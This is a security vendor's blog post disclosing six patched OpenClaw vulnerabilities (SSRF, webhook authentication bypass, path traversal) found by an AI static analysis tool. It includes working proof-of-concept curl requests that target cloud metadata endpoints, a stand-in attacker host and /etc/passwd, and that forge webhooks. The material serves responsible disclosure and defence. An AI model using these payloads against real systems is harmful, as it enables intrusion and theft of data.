---
title: "How AI SAST Traced Data Flows to Uncover Six OpenClaw Vulnerabilities | Blog | Endor Labs"
source: "https://www.endorlabs.com/learn/how-ai-sast-traced-data-flows-to-uncover-six-openclaw-vulnerabilities"
canonical_url: "https://www.endorlabs.com/learn/how-ai-sast-traced-data-flows-to-uncover-six-openclaw-vulnerabilities"
language: en
domdown_version: 0.3.3
image: "https://cdn.prod.website-files.com/6574c9e538a34feac8cec013/69950613b3fe01c993eb1ca5_AI%20SAST%20Traced%20Data%20Flows%20to%20Uncover%20Six%20OpenClaw%20Vulnerabilities.png"
description: We discovered six vulnerabilities in OpenClaw using Endor Labs’ AI SAST data flow analysis and validated working exploits.
---
In our[previous post](https://www.endorlabs.com/learn/ai-sast-in-action-finding-real-vulnerabilities-in-openclaw), we discussed how [Endor Labs' AI SAST engine](https://www.endorlabs.com/learn/introducing-ai-sast-that-thinks-like-a-security-engineer) successfully identified seven exploitable vulnerabilities in [OpenClaw](https://openclaw.ai/) through systematic analysis and validation. Now that OpenClaw has published patches and security advisories, we can share the technical details of how agentic data flow analysis uncovered these issues and enabled proof-of-concept development.

This post examines six disclosed vulnerabilities, walking through how the AI SAST engine traced data paths from user-controlled sources to dangerous sinks and how we validated each finding with working exploits.

## The data flow analysis advantage

Traditional static analysis often struggles with multi-layer applications where data transforms as it moves through different architectural boundaries. Endor Labs' AI SAST engine excels at maintaining context across these transformations, understanding not only where dangerous operations exist but also whether attacker-controlled data can reach them.

For each vulnerability below, we'll examine:

- **The data flow path** the AI SAST engine identified
- **How the engine maintained context** through transformations
- **The proof-of-concept** that validated exploitability
- **The fix** that addressed the root cause

## Summary of vulnerabilities in OpenClaw

| Vulnerability | CVE | GHSA | Severity |
| --- | --- | --- | --- |
| Gateway Tool SSRF | CVE-2026-26322 | GHSA-g6q9-8fvw-f7rf | High (CVSS 7.6) |
| Missing Telnyx Webhook Authentication | CVE-2026-26319 | GHSA-4hg8-92x6-h2f3 | High (CVSS 7.5) |
| SSRF in Urbit Authentication | No CVE ID | GHSA-4hg8-92x6-h2f3 | Moderate (CVSS 6.5) |
| Image Tool SSRF | No CVE ID | GHSA-56f2-hvwg-5743 | High (CVSS 7.6) |
| Twilio Webhook Authentication Bypass | No CVE ID | GHSA-c37p-4qqg-3p76 | Moderate (CVSS 6.5) |
| Path Traversal in Browser Upload | CVE-2026-26329 | GHSA-cv7m-c9jx-vg7q | High (No CVSS Assigned) |

## Vulnerability 1: Gateway Tool SSRF ([GHSA-g6q9-8fvw-f7rf](https://github.com/openclaw/openclaw/security/advisories/GHSA-g6q9-8fvw-f7rf))

**Severity:** High (CVSS 7.6)

**CWE:** CWE-918 (Server-Side Request Forgery)

### How AI SAST Identified It

The AI SAST engine traced a data flow where the gatewayUrl parameter from tool invocations flows directly into WebSocket connection establishment without validation.

**AI SAST Output:**

```javascript
{
  "title": "SSRF via User-Controlled Gateway URL",
  "level": "AI_LEVEL_HIGH",
  "cwes": ["CWE-918"],
  "explanation": "Tool argument 'gatewayUrl' from Canvas/Cron tool invocations flows
    through resolveGatewayOptions() into callGateway(), which opens a WebSocket
    connection to the provided URL without allowlisting or validation.",
  "dataflow": [{
    "relative_path": "src/agents/tools/gateway.ts",
    "function_name": "callGatewayTool(string,<unresolved>.GatewayCallOptions,...)",
    "start_line": 36,
    "end_line": 38
  }]
}
```

‍

**Identified Data Flow:**

- **Source:** Tool argument gatewayUrl in Gateway/Canvas/Cron tool calls
- **Flow:** resolveGatewayOptions() → callGateway() → WebSocket client
- **Sink:** new WebSocket(url) with user-controlled URL

The engine identified this across multiple tool invocation paths, recognizing that the Gateway URL handling lacked:

- Protocol allowlisting (accepting ws://, wss://, potentially others)
- Host validation or allowlisting
- IP address restrictions (no blocking of RFC1918, loopback, or cloud metadata ranges)

### The Data Flow Path

```javascript
Tool Invocation
  ↓
{"tool": "gateway", "gatewayUrl": "ws://169.254.169.254"}
  ↓
resolveGatewayOptions(opts)
  ↓
gateway = { url: opts.gatewayUrl, ... }
  ↓
callGateway({ url: gateway.url })
  ↓
new WebSocket(url) // No validation
```

‍

The AI SAST engine successfully traced this path across three layers: tool dispatch → gateway resolution → network layer. It recognized that, despite intermediate function calls and object destructuring, the user-controlled gatewayUrl reaches the WebSocket constructor without sanitization. The specific data flow was then verified by manual testing during the exploit development process.

### Proof of Concept

We validated this by invoking the Gateway tool with an attacker-controlled URL pointing to our test infrastructure:

```javascript
curl -X POST "http://localhost:9000/tools/invoke" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "tool": "gateway",
    "gatewayUrl": "ws://attacker-controlled.example.com",
    "method": "test",
    "params": {}
  }'
```

‍

The OpenClaw host attempted a WebSocket connection to our controlled endpoint, confirming SSRF. This allows attackers to:

- Probe internal network services
- Access cloud metadata endpoints (169.254.169.254)
- Bypass network-level restrictions
- Potentially chain with other vulnerabilities

### The Fix

[Commit c5406e1](https://github.com/openclaw/openclaw/commit/c5406e1d2434be2ef6eb4d26d8f1798d718713f4) restricted Gateway URL overrides to:

- Loopback addresses (127.0.0.1) on the configured gateway port
- The explicitly configured gateway.remote.url
- Rejection of disallowed protocols, credentials, query strings, and non-root paths

## Vulnerability 2: Missing Telnyx Webhook Authentication ([GHSA-4hg8-92x6-h2f3](https://github.com/openclaw/openclaw/security/advisories/GHSA-4hg8-92x6-h2f3))

**Severity:** High (CVSS 7.5)

**CWE:** CWE-306 (Missing Authentication for Critical Function)

### How AI SAST Identified It

The AI SAST engine identified an authentication bypass where HTTP webhook requests flow through verification logic that silently succeeds when the public key is unconfigured.

**AI SAST Output:**

```javascript
{
  "title": "Missing Authentication in TelnyxProvider.verifyWebhook",
  "level": "AI_LEVEL_HIGH",
  "cwes": ["CWE-306"],
  "explanation": "HTTP POST requests to the voice webhook in handleRequest() flow into
    TelnyxProvider.verifyWebhook(), which returns { ok: true } when publicKey is unset,
    allowing any unauthenticated request to proceed to parseWebhookEvent() and
    processEvent() without signature verification.",
  "dataflow": [{
    "relative_path": "extensions/voice-call/src/providers/telnyx.ts",
    "function_name": "TelnyxProvider.verifyWebhook(<unresolved>.WebhookContext)",
    "start_line": 78,
    "end_line": 80,
    "snippet": "verifyWebhook(ctx: WebhookContext): WebhookVerificationResult {\n
      if (!this.publicKey) {\n
        return { ok: true };\n
      }\n\n
      const signature = ctx.headers[\"telnyx-signature-ed25519\"];"
  }]
}
```

‍

**Identified Data Flow:**

- **Source:** HTTP POST requests to voice-call webhook endpoint
- **Flow:** handleRequest() → TelnyxProvider.verifyWebhook()
- **Sink:** return { ok: true } when !this.publicKey
- **Impact:** Unauthenticated webhook processing

### The Vulnerable Pattern

```javascript
verifyWebhook(ctx: WebhookContext): WebhookVerificationResult {
  if (!this.publicKey) {
    // Fails open - accepts unauthenticated requests
    return { ok: true };
  }

  // Signature verification code never reached...
  const signature = ctx.headers["telnyx-signature-ed25519"];
  // ...
}
```

‍

The AI SAST engine recognized this as a vulnerable code path and flagged the early return that bypasses authentication. It understood that:

1. This function is called for every inbound webhook
2. The conditional allows unauthenticated success
3. No alternative verification mechanism exists in the bypass path
4. The configuration gap (missing public key) is treated as a valid state rather than an error

### Proof of Concept

Testing against a deployment where the Telnyx public key was not configured:

```javascript
# Forge a Telnyx webhook without valid signature
curl -X POST "http://localhost:3334/voice/webhook" \
  -H "Content-Type: application/json" \
  -d '{
    "event_type": "call.initiated",
    "payload": {
      "call_control_id": "attacker-controlled",
      "from": "+1234567890",
      "to": "+0987654321"
    }
  }'
```

‍

The webhook handler accepted the forged request (HTTP 200) and processed it as a legitimate Telnyx event. This allows attackers to:

- Inject fake call events into the system
- Manipulate call state and routing
- Trigger automated actions without authentication
- Cause denial of service through event flooding

### The Fix

[Commits 29b587e and f47584f](https://github.com/openclaw/openclaw/security/advisories/GHSA-4hg8-92x6-h2f3) changed the verification to fail closed:

- Signature verification now fails if publicKey is not configured
- A development-only bypass (skipSignatureVerification: true) with loud warnings
- Required configuration documentation in plugin docs

## Vulnerability 3: SSRF in Urbit Authentication ([GHSA-pg2v-8xwh-qhcc](https://github.com/openclaw/openclaw/security/advisories/GHSA-pg2v-8xwh-qhcc))

**Severity:** Moderate (CVSS 6.5)

**CWE:** CWE-918 (Server-Side Request Forgery)

### How AI SAST Identified It

The engine traced Urbit authentication URLs from configuration directly into HTTP requests:

**AI SAST Output:**

```javascript
{
  "spec": {
    "ai_result": {
      "explanation": "The `account.url` value used in `monitor/index.ts` flows directly into `authenticate(account.url, account.code)`, where it is interpolated into `fetch(`${url}/~/login`)` without any validation of scheme, host, or destination. If an attacker can influence the `account` configuration (including `url`), this allows them to cause the extension's environment to send POST requests with credentials (`password=code`) to arbitrary internal or external services, constituting an SSRF risk.",
      "level": "AI_LEVEL_HIGH",
      "sast": {
        "cwes": [
          "CWE-918"
        ],
        "dataflow": [
          {
            "end_line": 2,
            "function_name": "authenticate(string,string)",
            "relative_path": "extensions/tlon/src/urbit/auth.ts",
            "snippet": "export async function authenticate(url: string, code: string): Promise<string> {\n  const resp = await fetch(`${url}/~/login`, {\n    method: \"POST\",\n    headers: { \"Content-Type\": \"application/x-www-form-urlencoded\" },\n    body: `password=${code}`,",
            "start_line": 2
          }
        ]
      },
      "title": "Server-Side Request Forgery via Unvalidated URL Parameter"
    }
  },
  "uuid": "69809d96b7060bb0d2d2e773"
}
```

‍

**Identified Data Flow:**

**Source:** Configuration value channels.tlon.account.url

**Flow:** authenticate(url, code) → fetch(\${url}/~/login`)`

**Sink:** HTTP POST to user-controlled URL

### The Data Flow

```javascript
Configuration
  ↓
channels.tlon.account.url = "http://attacker.com"
  ↓
authenticate(url, code)
  ↓
fetch(`${url}/~/login`, {
  method: "POST",
  body: `password=${code}`
})
```

‍

The AI SAST engine recognized that configuration values, while not directly user input in the traditional sense, represent a trust boundary. An attacker who can influence configuration (through config files, environment variables, or admin interfaces) gains control over the authentication URL.

### Proof of Concept

```javascript
# Configure malicious Urbit URL
# channels.tlon.account.url: "http://169.254.169.254"

# Trigger authentication
# OpenClaw attempts: POST http://169.254.169.254/~/login
```

‍

The server-side request to the cloud metadata endpoint was confirmed through network monitoring, demonstrating access to internal services.

### The Fix

[Commit bfa7d21](https://github.com/openclaw/openclaw/commit/bfa7d21e997baa8e3437657d59b1e296815cc1b1) added URL validation:

- Scheme restriction (HTTPS only)
- SSRF guard blocking private/internal hosts
- Opt-in allowance for private networks via channels.tlon.allowPrivateNetwork

## Vulnerability 4: Image Tool SSRF ([GHSA-56f2-hvwg-5743)](https://github.com/openclaw/openclaw/security/advisories/GHSA-56f2-hvwg-5743)

**Severity:** High (CVSS 7.6)

**CWE:** CWE-918 (Server-Side Request Forgery)

### How AI SAST Identified It

The engine traced image URLs from tool parameters through multiple layers to unprotected HTTP fetches.

**AI SAST Output:**

```javascript
{
  "title": "SSRF in Image Tool Remote Fetch",
  "level": "AI_LEVEL_HIGH",
  "cwes": ["CWE-918"],
  "explanation": "User-controlled tool argument 'image' in the Image tool invocation flows
    through createImageTool.execute() to loadWebMedia(), which fetches http(s) URLs via
    fetchRemoteMedia without any allowlist or network restriction when sandboxRoot is unset.",
  "dataflow": [{
    "relative_path": "src/agents/tools/image-tool.ts",
    "function_name": "createImageTool(<unresolved>.__anon_at_299:43,...)",
    "start_line": 410,
    "end_line": 412,
    "snippet": "const media = isDataUrl\n
      ? decodeDataUrl(resolvedImage)\n
      : await loadWebMedia(resolvedPath ?? resolvedImage, maxBytes);\n
      if (media.kind !== \"image\") {\n
        throw new Error(`Unsupported media type: ${media.kind}`);\n
      }"
  }]
}
```

‍

**Identified Data Flow:**

- **Source:** Tool argument image in Image tool invocation
- **Flow:** createImageTool() → loadWebMedia() → loadWebMediaInternal() → fetchRemoteMedia()
- **Sink:** fetch(url) without SSRF protection

The critical insight was maintaining data flow context across four function calls and multiple file boundaries. The engine understood that:

1. The image parameter accepts URLs
2. URL detection happens via regex (/^https?:\/\//i)
3. No validation occurs before the fetch
4. The fetch occurs without SSRF guards when sandboxRoot is unset

### The Multi-Layer Trace

```javascript
Tool Invocation
  ↓
{"tool": "image", "image": "http://127.0.0.1:8080/internal"}
  ↓
createImageTool() [image-tool.ts:412]
  const media = await loadWebMedia(resolvedImage, maxBytes)
  ↓
loadWebMedia() [media.ts]
  →  loadWebMediaInternal()
  ↓
loadWebMediaInternal() [media.ts:212]
  if (/^https?:\/\//i.test(mediaUrl)) {
    return fetchRemoteMedia({ url: mediaUrl })  // No validation
  }
```

‍

Proof of Concept

```javascript
curl -X POST "http://localhost:9000/v1/responses" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "model": "openai/gpt-4o",
    "input": [{"type": "message", "role": "user",
               "content": "Analyze this image: http://169.254.169.254/latest/meta-data/"}],
    "input_image": {"type": "url",
                    "url": "http://169.254.169.254/latest/meta-data/"}
  }'
```

‍

Server-side fetch confirmed through error response indicating MIME type validation failure—proving the fetch occurred even though the payload wasn't an image.

### The Fix

[Commits 81c68f5 and 9bd64c8](https://github.com/openclaw/openclaw/commit/81c68f582d4a9a20d9cca9f367d2da9edc5a65ae) routed remote media fetching through SSRF guards:

- Private/internal IP blocking
- Hostname validation
- Redirect hardening
- DNS pinning

## Vulnerability 5: Twilio Webhook Authentication Bypass ([GHSA-c37p-4qqg-3p76](https://github.com/openclaw/openclaw/security/advisories/GHSA-c37p-4qqg-3p76))

**Severity:** Moderate (CVSS 6.5)

**CWE:** CWE-306 (Missing Authentication)

### How AI SAST Identified It

The engine identified a bypass in signature verification logic where loopback address detection incorrectly exempts public webhooks from authentication.

**AI SAST Output:**

```javascript
{
  "title": "Authentication Bypass in verifyTwilioWebhook",
  "level": "AI_LEVEL_HIGH",
  "cwes": ["CWE-306"],
  "explanation": "HTTP POST requests sent to the public ngrok webhook URL are forwarded
    by the ngrok agent to the local server and appear with a loopback remoteAddress.
    These requests flow through verifyTwilioWebhook() and return ok:true when
    allowNgrokFreeTierLoopbackBypass is enabled, bypassing validateTwilioSignature()
    entirely.",
  "dataflow": [{
    "relative_path": "extensions/voice-call/src/webhook-security.ts",
    "function_name": "verifyTwilioWebhook(<unresolved>.WebhookContext,string,...)",
    "start_line": 201,
    "end_line": 214,
    "snippet": "const isNgrokFreeTier =\n
      verificationUrl.includes('.ngrok-free.app') || verificationUrl.includes('.ngrok.io');\n\n
      if (\n
        isNgrokFreeTier &&\n
        options?.allowNgrokFreeTierLoopbackBypass &&\n
        isLoopbackAddress(ctx.remoteAddress)\n
      ) {\n
        console.warn(...);\n
        return {\n
          ok: true,\n
          reason: 'ngrok free tier compatibility mode (loopback only)',\n
          verificationUrl,\n
          isNgrokFreeTier: true,\n
        };\n
      }"
  }]
}
```

‍

**Identified Data Flow:**

- **Source:** HTTP POST to public ngrok webhook URL
- **Flow:** ngrok forwards to localhost → verifyTwilioWebhook() sees loopback remoteAddress
- **Sink:** return { ok: true } when ngrok bypass enabled

### The Subtle Logic Flaw

```javascript
const isNgrokFreeTier = verificationUrl.includes('.ngrok-free.app');

if (isNgrokFreeTier &&
    options?.allowNgrokFreeTierLoopbackBypass &&
    isLoopbackAddress(ctx.remoteAddress)) {
  return { ok: true };  // Bypasses signature verification
}
```

‍

The AI SAST engine understood the semantic gap: while the remoteAddress is loopback (because ngrok forwards locally), the _actual_ external request comes from the public internet. The verification bypass was intended for development but inadvertently affected production deployments using ngrok.

### Proof of Concept

With ngrok tunnel active and allowNgrokFreeTierLoopbackBypass enabled:

```javascript
# External attacker sends to public ngrok URL
curl -X POST "https://abc123.ngrok-free.app/voice/webhook" \
  -H "Content-Type: application/json" \
  -H "X-Twilio-Signature: invalid-signature" \
  -d '{"event": "call.initiated"}'
```

‍

Request accepted despite invalid signature, confirming external attackers can forge webhooks.

### The Fix

[Commit ff11d87](https://github.com/openclaw/openclaw/commit/ff11d8793b90c52f8d84dae3fbb99307da51b5c9) changed the bypass to only affect header trust (for URL reconstruction), not signature verification itself.

## Vulnerability 6: Path Traversal in Browser Upload ([GHSA-cv7m-c9jx-vg7q](https://github.com/openclaw/openclaw/security/advisories/GHSA-cv7m-c9jx-vg7q))

**Severity:** High (No CVSS assigned yet)

**CWE:** CWE-22 (Path Traversal)

### How AI SAST Identified It

The engine traced file paths from tool arguments through three architectural layers to Playwright's file API without any validation.

**AI SAST Output:**

```javascript
{
  "title": "Path Traversal in setInputFilesViaPlaywright",
  "level": "AI_LEVEL_HIGH",
  "cwes": ["CWE-22"],
  "explanation": "HTTP POST parameter 'paths' in /hooks/file-chooser flows through
    toStringArray() in src/browser/routes/agent.act.ts into setInputFilesViaPlaywright()
    and is passed to Playwright locator.setInputFiles(), which reads local files without
    any path allowlisting or restriction.",
  "dataflow": [{
    "relative_path": "src/browser/pw-tools-core.interactions.ts",
    "function_name": "setInputFilesViaPlaywright(<unresolved>.__anon_at_506:56,...)",
    "start_line": 531,
    "end_line": 531,
    "snippet": "const locator = inputRef ? refLocator(page, inputRef) : page.locator(element).first();\n\n
      try {\n
        await locator.setInputFiles(opts.paths);\n
      } catch (err) {\n
        throw toAIFriendlyError(err, inputRef || element);\n
      }"
  }]
}
```

‍

**Identified Data Flow:**

- **Source:** paths parameter in browser upload action
- **Flow:** /tools/invoke → browser tool dispatch → /hooks/file-chooser route → setInputFilesViaPlaywright()
- **Sink:** locator.setInputFiles(opts.paths) — reads arbitrary files

### The Complete Data Flow

```javascript
HTTP Request
  ↓
POST /tools/invoke
  {"tool": "browser", "action": "upload",
   "args": {"paths": ["/etc/passwd"]}}
  ↓
browser-tool.ts:603-635
  Upload action dispatches to browser control
  ↓
routes/agent.act.ts:335-365
  /hooks/file-chooser route handler
  const paths = toStringArray(body.paths)  // No validation
  ↓
pw-tools-core.interactions.ts:531
  await locator.setInputFiles(opts.paths)  // Playwright reads files
```

‍

The AI SAST engine maintained context through:

1. HTTP request parsing and routing
2. Tool dispatch layer
3. Browser control IPC boundary
4. Playwright API call

It recognized that no validation occurs at any layer, making this a systemic issue rather than a single oversight.

### Proof of Concept

```javascript
# 1. Open page with file input
curl -X POST "http://localhost:9000/tools/invoke" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"tool":"browser","action":"open",
       "args":{"targetUrl":"data:text/html,<input type=file id=f>"}}'

# 2. Upload /etc/passwd via path traversal
curl -X POST "http://localhost:9000/tools/invoke" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"tool":"browser","action":"upload",
       "args":{"element":"#f","paths":["/etc/passwd"]}}'

# 3. Take snapshot showing file contents
curl -X POST "http://localhost:9000/tools/invoke" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"tool":"browser","action":"snapshot"}'
```

‍

Snapshot output confirmed: File: passwd Size: 878 — demonstrating successful arbitrary file read. File contents are accessible to page JavaScript via FileReader API, enabling exfiltration.

### The Fix

[Commit 3aa94af](https://github.com/openclaw/openclaw/commit/3aa94afcfd12104c683c9cad81faf434d0dadf87) confined upload paths:

- Paths restricted to OpenClaw's upload temp directory
- Traversal sequences (../) rejected
- Absolute paths rejected
- Validation is enforced before Playwright API call

## Common patterns across vulnerabilities

Analyzing these six vulnerabilities reveals patterns the AI SAST engine successfully detected:

**Missing Input Validation at Trust Boundaries:** Every vulnerability involves user-controlled data (tool arguments, configuration values, HTTP parameters) reaching security-sensitive operations without validation. The engine traced these paths across architectural layers.

**Multi-Layer Data Flows.** Several vulnerabilities spanned 3-5 function calls across multiple files. Traditional point-in-time analysis would miss these, but the AI SAST engine maintained data flow context throughout.

**Configuration as Attack Surface.**Two SSRF issues (Gateway and Urbit) involved configuration values. The engine correctly identified configuration as a trust boundary requiring validation.

**Fail-Open Authentication.** Two webhook vulnerabilities (Telnyx and Twilio) failed when certain conditions weren't met. The engine recognized these as security-critical code paths where missing configuration should fail closed.

**Framework API Misuse.**The path traversal vulnerability resulted from passing user-controlled paths directly to Playwright's API without validation. The engine understood the security implications of this pattern.

## Lessons for AI infrastructure security

These findings reinforce several important principles:

**Data flow analysis is essential for modern applications.** The multi-layer architecture of AI agent frameworks means vulnerabilities often span multiple files and components. Understanding the complete source-to-sink path is critical.

**Trust boundaries extend beyond traditional user input.** Configuration values, LLM outputs, and tool parameters all represent potential attack surfaces that require validation.

**Validation must occur at every layer.** Several vulnerabilities existed because validation was missing at _all_ stages. Defense in depth requires consistent security controls throughout the stack.

**AI-specific patterns require specialized analysis.** Traditional SAST tools, designed for conventional web applications, lack the architectural understanding to identify issues in LLM-to-tool flows, conversation state management, and agent-specific trust boundaries.

## Disclosure timeline

- **2026-02-03:** Vulnerabilities discovered via AI SAST analysis
- **2026-02-04:** Findings validated with working PoCs
- **2026-02-05:** Responsible disclosure to OpenClaw maintainers
- **2026-02-14:** First patch released (2026.2.2 - Image SSRF)
- **2026-02-15:** Remaining patches released (2026.2.14)
- **2026-02-15:** Security advisories published

The OpenClaw team's rapid response and comprehensive fixes demonstrate the value of responsible disclosure and collaborative security improvement.

## Conclusion

The six vulnerabilities detailed here, spanning SSRF, missing authentication, and path traversal, demonstrate how AI-powered data flow analysis identifies real security issues in complex, multi-layer applications. Endor Labs' AI SAST engine successfully:

- Traced data flows across 3-5 architectural layers
- Maintained context through function calls and object transformations
- Recognized security-critical patterns (fail-open authentication, missing validation)
- Distinguished between different trust levels (configuration vs direct user input)
- Identified AI-specific architectural patterns

Every finding was confirmed through working proof-of-concept exploits, validating the accuracy of the data flow analysis. The combination of AI-powered analysis and systematic manual validation provides a practical path forward for securing AI infrastructure.

As AI agent frameworks become more prevalent in enterprise environments, security analysis must evolve to address both traditional vulnerabilities and AI-specific attack surfaces. The results from OpenClaw demonstrate that this evolution is already underway.

## Resources

- [AI SAST in Action: Finding Real Vulnerabilities in OpenClaw](https://www.endorlabs.com/learn/ai-sast-in-action-finding-real-vulnerabilities-in-openclaw)
- [Classic Vulnerabilities Meet AI Infrastructure: Why MCP Needs AppSec](https://www.endorlabs.com/learn/classic-vulnerabilities-meet-ai-infrastructure-why-mcp-needs-appsec)
- [OpenClaw Security Advisories](https://github.com/openclaw/openclaw/security/advisories)